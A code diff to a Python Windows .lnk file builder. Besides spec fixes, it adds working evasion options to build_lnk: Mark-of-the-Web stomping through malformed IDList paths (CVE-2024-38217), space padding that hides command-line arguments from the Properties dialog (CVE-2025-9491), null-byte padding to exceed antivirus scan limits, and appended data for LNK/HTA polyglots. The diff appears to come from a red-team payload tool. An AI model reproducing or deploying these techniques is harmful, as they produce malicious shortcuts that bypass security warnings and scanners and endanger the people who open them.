@@ -1,6 +1,7 @@
 """Build Windows .lnk files per the MS-SHLLINK spec -- pure struct packing."""
 
 import struct
+import warnings
 from datetime import UTC, datetime
 from pathlib import Path
 from typing import Any
@@ -13,6 +14,7 @@ from ._constants import (
     EXT_SIG,
     EXT_VERSION,
     FILETIME_UNIX_EPOCH_DELTA,
+    HOTKEY_VK_VALID,
     KNOWN_FOLDER_GUIDS,
     LINK_CLSID,
     SW_SHOWNORMAL,
@@ -303,6 +305,52 @@ def _build_idlist_items(
     return bytes(items)
 
 
+def _build_idlist_stomp_dot(
+    target_path: TargetPath, file_size: int = 0, write_time: Timestamp = None
+) -> bytes:
+    """IDList with a trailing period on the final item name (MotW stomp).
+
+    Explorer canonicalizes the path on first access (stripping the dot),
+    which rewrites the .lnk and drops the Mark-of-the-Web ADS.
+    """
+    drive, path_parts = _parse_target_path(target_path)
+    # Append dot to the final segment name(s)
+    if path_parts:
+        last = path_parts[-1]
+        if isinstance(last, tuple):
+            path_parts[-1] = (last[0] + ".", last[1] + ".")
+        else:
+            path_parts[-1] = last + "."
+
+    items = bytearray()
+    items += _id_root()
+    items += _id_drive(drive)
+    items += _build_fs_items(path_parts, file_size=file_size, write_time=write_time)
+    items += struct.pack("<H", 0)  # terminator
+    return struct.pack("<H", len(items)) + items
+
+
+def _build_idlist_stomp_relative(
+    target_path: TargetPath, file_size: int = 0, write_time: Timestamp = None
+) -> bytes:
+    """IDList with root + drive but only the bare filename, triggering MotW stomp.
+
+    Omitting intermediate directory segments forces Explorer to resolve and
+    rewrite the .lnk, stripping the Mark-of-the-Web ADS.
+    """
+    drive, path_parts = _parse_target_path(target_path)
+    # Keep only the last segment (the filename)
+    if path_parts:
+        path_parts = [path_parts[-1]]
+
+    items = bytearray()
+    items += _id_root()
+    items += _id_drive(drive)
+    items += _build_fs_items(path_parts, file_size=file_size, write_time=write_time)
+    items += struct.pack("<H", 0)  # terminator
+    return struct.pack("<H", len(items)) + items
+
+
 # ---------------------------------------------------------------------------
 # LinkInfo
 # ---------------------------------------------------------------------------
@@ -537,8 +585,15 @@ def _build_vista_idlist_block(idlist_bytes: bytes) -> bytes:
     Args:
         idlist_bytes: Pre-built IDList item bytes (items + terminator,
                       no outer size prefix).
+
+    Note: The spec (2.5.11) says offset +8 contains "An IDList structure
+    (section 2.2.1)", which is defined as ``*ITEMID TERMINALID`` with no
+    size prefix.  However, the minimum BlockSize of 0x0A (10 = 4+4+2)
+    implies a uint16 size prefix is expected, matching the LinkTargetIDList
+    (section 2.2) pattern.  This is consistent with observed Windows
+    behavior and roundtrips correctly.
     """
-    # IDList is prefixed with its own uint16 size
+    # IDList is prefixed with its own uint16 size (see note above)
     idlist_with_size = struct.pack("<H", len(idlist_bytes)) + idlist_bytes
     block_size = 4 + 4 + len(idlist_with_size)
     block = bytearray()
@@ -773,6 +828,10 @@ def build_lnk(
     drive_type: int = 3,
     network_device_name: str = "",
     network_provider_type: int = 0x00020000,
+    pad_args: int = 0,
+    pad_size: int = 0,
+    append_data: bytes = b"",
+    stomp_motw: str = "",
 ) -> bytes:
     """Return the raw bytes of a complete .lnk file.
 
@@ -790,8 +849,8 @@ def build_lnk(
         relative_path:   Relative path from LNK location to target.
         working_dir:     Start-in directory.
         arguments:       Command-line arguments for the target.
-        show_command:    Window state: SW_SHOWNORMAL (1), SW_MAXIMIZED (3),
-                         or SW_MINIMIZED (7).
+        show_command:    Window state: SW_SHOWNORMAL (1), SW_SHOWMAXIMIZED (3),
+                         or SW_SHOWMINNOACTIVE (7).
         file_size:       Target file size in bytes (populates header + IDList).
         file_attributes: FileAttributesFlags (section 2.1.2).  Defaults to
                          0x20 (FILE_ATTRIBUTE_ARCHIVE).
@@ -832,8 +891,33 @@ def build_lnk(
         network_device_name: Mapped drive letter for UNC targets (e.g. ``"Z:"``).
                          Sets ValidDevice flag in CommonNetworkRelativeLink.
         network_provider_type: WNNC_NET_* network provider type for UNC targets.
-                         Default 0x00020000 (WNNC_NET_LANMAN).
+                         Default 0x00020000 (WNNC_NET_LANMAN -- not in v10.0
+                         normative table but is the standard SMB/CIFS provider).
+        pad_args:        Number of space characters (0x20) to prepend to
+                         *arguments*, pushing the real args past the ~260-char
+                         visible boundary in the Windows Properties dialog
+                         (ZDI-CAN-25373 / CVE-2025-9491).
+        pad_size:        Number of null bytes to append after the terminal
+                         ExtraData block, inflating file size past AV/sandbox
+                         scan limits (T1027.001 binary padding).
+        append_data:     Arbitrary bytes to append after the terminal block
+                         (and after any padding).  Enables LNK/HTA polyglot
+                         payloads where mshta.exe parses embedded HTA content.
+        stomp_motw:      MotW bypass via malformed IDList paths
+                         (CVE-2024-38217).  ``"dot"`` appends a period to the
+                         final target filename; ``"relative"`` uses a bare
+                         filename without drive/directory path segments.
     """
+    # -- Argument padding (ZDI-CAN-25373) --
+    if pad_args > 0:
+        arguments = " " * pad_args + arguments
+
+    # -- Validate stomp_motw --
+    if stomp_motw and stomp_motw not in ("dot", "relative"):
+        raise ValueError(
+            f"Invalid stomp_motw {stomp_motw!r}; must be 'dot' or 'relative'"
+        )
+
     # Resolve target to a path string for LinkInfo / StringData
     if isinstance(target, list):
 
@@ -846,11 +930,22 @@ def build_lnk(
 
     is_unc = isinstance(target, str) and target.startswith("\\\\")
 
+    if stomp_motw and is_unc:
+        raise ValueError("stomp_motw is not supported for UNC targets")
+
     # GAP-L: Validate ShowCommand (spec 2.1 -- only 1, 3, 7 are valid)
     if show_command not in (1, 3, 7):
         raise ValueError(
             f"Invalid show_command {show_command}; "
-            f"must be SW_SHOWNORMAL (1), SW_MAXIMIZED (3), or SW_MINIMIZED (7)"
+            f"must be SW_SHOWNORMAL (1), SW_SHOWMAXIMIZED (3), or SW_SHOWMINNOACTIVE (7)"
+        )
+
+    # Spec 2.1.2: FileAttributes bits 3 and 6 are reserved, MUST be zero.
+    if file_attributes & 0x48:
+        warnings.warn(
+            f"file_attributes 0x{file_attributes:08X} has reserved bits set "
+            f"(bits 3 and 6 MUST be zero per spec section 2.1.2)",
+            stacklevel=2,
         )
 
     # -- Flags --
@@ -889,6 +984,13 @@ def build_lnk(
     struct.pack_into("<I", hdr, 52, file_size)  # FileSize
     struct.pack_into("<i", hdr, 56, icon_index)  # IconIndex
     struct.pack_into("<I", hdr, 60, show_command)  # ShowCommand
+    # Spec 2.1.3: HotKey VK code should be from the normative list.
+    if hotkey_vk and hotkey_vk not in HOTKEY_VK_VALID:
+        warnings.warn(
+            f"hotkey_vk 0x{hotkey_vk:02X} is not in the MS-SHLLINK section 2.1.3 "
+            f"normative VK code list for HotKey",
+            stacklevel=2,
+        )
     struct.pack_into("<B", hdr, 64, hotkey_vk)  # HotKey low byte (vk)
     struct.pack_into("<B", hdr, 65, hotkey_mod)  # HotKey high byte (mod)
 
@@ -902,7 +1004,16 @@ def build_lnk(
             network_provider_type=network_provider_type,
         )
     else:
-        out += _build_idlist(target, file_size=file_size, write_time=write_time)
+        if stomp_motw == "dot":
+            out += _build_idlist_stomp_dot(
+                target, file_size=file_size, write_time=write_time
+            )
+        elif stomp_motw == "relative":
+            out += _build_idlist_stomp_relative(
+                target, file_size=file_size, write_time=write_time
+            )
+        else:
+            out += _build_idlist(target, file_size=file_size, write_time=write_time)
         out += _build_linkinfo(
             target_path_str,
             vol_label=volume_label,
@@ -955,6 +1066,12 @@ def build_lnk(
     if property_stores:
         out += _build_property_store_block(property_stores)
     out += _build_terminal_block()
+
+    # -- Post-terminal data --
+    if pad_size > 0:
+        out += b"\x00" * pad_size
+    if append_data:
+        out += append_data
 
     return bytes(out)
 
